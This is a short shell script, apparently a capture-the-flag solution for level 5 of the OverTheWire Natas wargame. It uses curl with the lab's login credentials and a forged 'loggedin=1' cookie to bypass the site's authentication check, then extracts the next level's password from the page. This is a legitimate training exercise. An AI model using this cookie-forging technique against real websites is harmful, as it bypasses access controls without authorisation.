#!/bin/sh

RESPONSE=$(curl --silent \
                --user natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq \
                --cookie "loggedin=1" \
                http://natas5.natas.labs.overthewire.org/)
PASSWORD=$(echo ${RESPONSE} | grep -Po "(?<=The password for natas6 is )[A-Za-z0-9]{32}")
printf "The password for natas06 is: ${PASSWORD}\n"
